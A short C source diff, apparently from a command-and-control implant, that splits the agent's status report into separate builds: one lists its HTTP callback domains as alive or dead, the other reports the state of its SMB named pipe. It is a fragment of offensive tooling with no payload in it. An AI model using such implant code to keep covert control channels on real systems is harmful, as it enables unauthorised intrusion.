@@ -41,17 +41,38 @@ VOID AgentStatus(_In_ PCHAR taskUuid, _In_ PPARSER arguments)
 
     PPackage data = PackageInit(0, NULL);
 
-    PCALLBACK_NODE current = xenonConfig->CallbackDomainHead;  // Start at head
-    int count = 0;
-    while (current) {  // Loop while the current node is not NULL
-        count++;
-        PackageAddFormatPrintf(data, FALSE, "%s:%d -> %s%s\n",
-                            current->hostname, current->port,
-                            current->isDead ? "DEAD" : "ALIVE",
-                        current == xenonConfig->CallbackDomains ? "\t(current)" : "");
+#ifdef HTTPX_TRANSPORT
 
-        current = current->next;  // Move to the next node
+    PCALLBACK_NODE Current = xenonConfig->CallbackDomainHead;  // Start at head
+    int count = 0;
+    while (Current) {  // Loop while the current node is not NULL
+        count++;
+        PackageAddFormatPrintf(
+            data, 
+            FALSE, 
+            "%s:%d -> %s%s\n",
+            Current->hostname, 
+            Current->port,
+            Current->isDead ? "DEAD" : "ALIVE",
+            Current == xenonConfig->CallbackDomains ? "\t(current)" : ""
+        );
+
+        Current = Current->next;  // Move to the next node
     }
+
+#endif
+
+#ifdef SMB_TRANSPORT
+
+    PackageAddFormatPrintf(
+        data, 
+        FALSE, 
+        "%s -> %s\n",
+        xenonConfig->SmbPipename,
+        xenonConfig->SmbPipe == NULL ? "DEAD" : "ALIVE"
+    );
+
+#endif
 
     // Success
     PackageComplete(taskUuid, data);
